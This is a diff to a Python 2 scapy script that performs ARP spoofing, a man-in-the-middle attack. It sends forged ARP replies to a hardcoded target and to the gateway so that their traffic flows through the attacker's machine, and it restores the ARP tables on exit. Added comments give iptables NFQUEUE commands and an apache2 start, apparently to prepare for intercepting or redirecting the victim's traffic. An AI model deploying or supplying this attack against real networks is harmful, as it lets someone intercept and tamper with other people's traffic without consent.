@@ -1,6 +1,9 @@
 #python 2
 # To make your pc a router you need to give the command on terminal
 #echo 1 > /proc/sys/net/ipv4/ip_forward
+#command before running this program, "iptables -I OUTPUT -j NFQUEUE --queue-num 0"
+#command before running this program, "iptables -I INPUT -j NFQUEUE --queue-num 0"
+# service apache2 start
 import scapy.all as scapy
 import time
 import sys
@@ -25,32 +28,51 @@ def get_mac(ip):
 #     print(answered_list[0][1].hwsrc)
 
 
-def spoof(target_ip,spoof_ip):
-    target_mac = get_mac(target_ip)
+def target_spoof():
     #op=1 for sending op=2 for receiveing
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
     # print(packet.summary())
     # print(packet.show())
     scapy.send(packet,verbose=False)
 
-def restore(destination_ip, source_ip):
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst = destination_mac, psrc=source_ip,hwsrc=source_mac)
+
+def geteway_spoof():
+
+    #op=1 for sending op=2 for receiveing
+    packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+    # print(packet.summary())
+    # print(packet.show())
+    scapy.send(packet,verbose=False)
+
+
+def target_restore(target_ip,gateway_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst = target_mac, psrc=gateway_ip,hwsrc=gateway_mac)
     # print(packet.show())
     # print(packet.summary())
-    scapy.send(packet,count=4,verbose=False)
+    scapy.send(packet, count=4, verbose=False)
+
+
+def gateway_restore(gateway_ip,target_ip):
+    packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst = gateway_mac, psrc=target_ip,hwsrc=target_mac)
+    # print(packet.show())
+    # print(packet.summary())
+    scapy.send(packet, count=4, verbose=False)
+
 
 
 # get_mac("192.168.0.1/24")
-target_ip = "192.168.0.101"
+target_ip = "192.168.0.105"
+target_mac = get_mac(target_ip)
 gateway_ip = "192.168.0.1"
+gateway_mac = get_mac(gateway_ip)
 send_packets_count = 0
 try:
     send_packets_count = 0
     while True:
-        spoof(target_ip,gateway_ip)
-        spoof(gateway_ip,target_ip)
+        # target_spoof(target_ip,gateway_ip)
+        # geteway_spoof(gateway_ip,target_ip)
+        target_spoof()
+        geteway_spoof()
         send_packets_count = send_packets_count + 2
         # \r means always start from the start of the line
         print("\r[+] Packets sent "+str(send_packets_count)),
@@ -58,5 +80,5 @@ try:
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n[+] Detected CTRK+C............Resetting ARP tables..... please wait.\n")
-    restore(target_ip,gateway_ip)
-    restore(gateway_ip, target_ip)
+    target_restore(target_ip,gateway_ip)
+    gateway_restore(gateway_ip, target_ip)
